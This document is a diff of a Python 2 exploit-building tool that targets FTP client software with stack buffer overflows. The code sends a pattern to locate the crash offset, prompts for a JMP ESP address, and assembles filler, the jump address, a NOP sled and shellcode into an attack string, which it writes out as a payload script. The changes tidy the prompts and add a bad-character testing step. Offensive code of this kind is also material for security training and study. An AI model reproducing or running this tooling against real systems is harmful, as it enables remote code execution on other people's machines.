@@ -22,15 +22,21 @@ Y="\033[1;33m"
 class SERVER_BUFFER():
         
       def __init__(self): 
+            
              global W
              global R
              global G
              global O
              global B
              global P
-             global Y            
+             global Y  
+             mode = """
+                       ========================                          
+                         Target FTP Clinet
+                       ========================
+                               """
+             print R+mode+W          
              time.sleep(2)
-             print O+"\n[A]"+W+R+" Buffer helper Start Target FTP Client mode  "+W+O+"[C]"+W  
              time.sleep(2)
              self.app_name = str(raw_input(O+"\n[?]"+W+B+" Enter The Application Name you Try Exploit : "+W))         
              self.string_ramd() 
@@ -38,6 +44,7 @@ class SERVER_BUFFER():
              self.connect_client()
              self.option_ret()
              self._hexadecimal()
+             self.import_char()
              self.little_endian()
              self.attack()
              self.auto_write()
@@ -74,7 +81,6 @@ class SERVER_BUFFER():
               self.Random_String = bytearray(self.Random_String)
 	      print Y+"\n[+]"+W+R+"String Pattern is Generated in length:"+W,len(self.Random_String ),#"\n\n",(self.Random_String).strip()
 	      print
-	      time.sleep(2)
           except Exception:
               time.sleep(2)
               print Y+"\n[()]"+W+R+"Check input integer Required"+W+Y+"[()]"+W
@@ -87,7 +93,6 @@ class SERVER_BUFFER():
           try:
                 
               client , addr =  self.listen_sock.accept()
-              time.sleep(2)
               print Y+"\n[(-)]"+W+R+"BUFFER_HELPER CONNECTION ACCEPT FROM "+W+'%s:'%(addr[0],),P+"[(+)]"+W  
               client.settimeout(10) 
               while True:                 
@@ -96,9 +101,9 @@ class SERVER_BUFFER():
           except socket.error, exc: 
           
                           print O+"\n[-_-]"+W+R+"Data Send Successful"+W+O+"[-_-]"+W                            
-                          time.sleep(2)
+                          time.sleep(1)
                           print O+"\n[(!)]"+W+Y+"Connection is Down >> Exception Socket.Error"+W+O+" :"+W +R+"%s\n" %exc+W
-                          time.sleep(2) 
+                          time.sleep(1) 
           except KeyboardInterrupt:
                    print Banner
                    exit()
@@ -108,7 +113,7 @@ class SERVER_BUFFER():
           try:
               continue_1   = "c".lower()            
               return_back  = "b".lower()
-              op_sel = str(raw_input(O+"\n[<>]"+W+B+"To Continue Press"+W+R+" C"+W+B+"To Return Back  Press "+W+R+"B"+W+B+": "+W)).lower()
+              op_sel = str(raw_input(O+"\n[<>]"+W+B+"To Continue Press"+W+R+" C "+W+B+"To Return Back  Press "+W+R+"B"+W+B+": "+W)).lower()
               if op_sel== continue_1 and  len(op_sel)==1:
                    pass
               elif op_sel ==return_back and len(op_sel)==1:
@@ -117,7 +122,7 @@ class SERVER_BUFFER():
                   self.connect_client()
                   self.option_ret()
               else:
-                  print Y+"\n[-]"+W+R+"Please Enter "+W+B+"C"+W+R+" or"+W+B+"B"+W+Y+"[-]"+W
+                  print Y+"\n[-]"+W+R+"Please Enter "+W+B+"C"+W+R+" or "+W+B+"B"+W+Y+"[-]"+W
                   self.option_ret()
           except KeyboardInterrupt:
                    print Banner
@@ -149,7 +154,34 @@ class SERVER_BUFFER():
                  except KeyboardInterrupt:
                        print  Banner
                        exit() 
-                   
+      def import_char(self): 
+         try:
+             
+            Bad = "yes".lower()
+            Bad_no = "no".lower()                 
+            bad_op = str(raw_input(Y+"\n[<>]"+W+R+"To Test Bad_Character Enter "+W+B+"yes "+W+R +"To Skip Enter "+W+B+" no : "+W)).lower()
+            
+            if bad_op == Bad and len(Bad)==3: 
+                self.listen_sock.close()
+                banner = """  
+                    ========================                          
+                      Bad_Character start
+                    ========================\n 
+                      """
+                print B+banner+W 
+                with open('.data','w')as data :
+                    data3 = data.write(str(self.location))          
+                time.sleep(2)
+                from Bad_Character import Bad_Character_Clinet             
+                run = Bad_Character_Clinet()
+            elif bad_op ==Bad_no and len(Bad_no)==2: 
+                pass
+            else:
+              print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
+              self.import_char()                   
+         except KeyboardInterrupt:
+                print  Banner
+                exit()                             
       def little_endian(self):
                try:
                     jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
@@ -181,7 +213,7 @@ class SERVER_BUFFER():
                  self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address) 
                  self.NO_Operation = self.NO_Operation*"\x90" 
                  self.count = self.NO_Operation.count("\x90")  
-                 attack = Start_string+self.jump_address+ self.NO_Operation +shell_code
+                 attack = Start_string+self.jump_address+ self.NO_Operation +str(shell_code)
                  time.sleep(2) 
                  print Y+'\n[+]'+W+B+'attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ "A"+W+O+'+'+W+B+\
                  ' JMP ESP ='+W,Y+self.display+W,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O+'+'+W+P+' shellcode'+W
@@ -206,7 +238,7 @@ class SERVER_BUFFER():
       def auto_write(self): 
               
                 try:                
-                  shell =shell_code.encode("hex")
+                  shell =str(shell_code).encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                   self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                   copy_format= shutil.copy("./FTP.Client_payload.txt","./FTP.Client_paylaod.py")
